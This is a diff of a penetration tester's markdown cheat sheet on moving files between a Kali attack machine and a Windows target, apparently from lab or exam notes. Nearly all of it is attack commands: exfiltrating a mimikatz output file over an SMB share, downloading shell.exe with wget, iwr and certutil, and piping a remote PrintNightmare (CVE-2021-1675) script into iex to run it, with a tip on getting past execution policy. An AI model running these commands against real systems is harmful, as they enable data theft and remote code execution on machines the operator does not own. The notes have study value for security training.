@@ -1,27 +1,30 @@
-from windows back to my kali linux
+#### from windows back to my kali linux
 on kali run
 ```
 smbserver.py smb share/ -smb2support
 ```
 on windows, run:
 ```
-net use \\192.168.49.109\smb
+net use \\10.21.90.250\smb
 ```
 then copy the file
 ```
 copy .\mimi_allyouneed101.txt \\192.168.49.109\smb\mimi_allyouneed101.txt
 ```
+#### If SMB share has read,write can use both directions
 
-wget
+---
+## From kali to windows
+#### wget
 ```
 wget http://10.10.14.169/shell.exe -o s.exe
 ```
-
-iwr
+#### iwr
 ```
 iwr -uri http://10.10.14.169/shell.exe -o s.exe
 ```
 
+#### certutil
 ```
 certutil -split -urlcache -f http://192.168.49.109/chkaccess.exe C:\\Users\\rudi.davis\\Desktop\\chkaccess.exe
 ```
@@ -33,6 +36,8 @@ curl 10.10.14.6/CVE-2021-1675.ps1 -UseBasicParsing | iex
 - `-UseBasicParsing` allows the file to come back without IE
 - `iex` imports (or runs) the script 
 	- useful if can't import/run a script when transferred via other means because of execution policy and `powershell -ep bypass` doesn't work
+
+---
 
 ### NC from remote to host
 ```
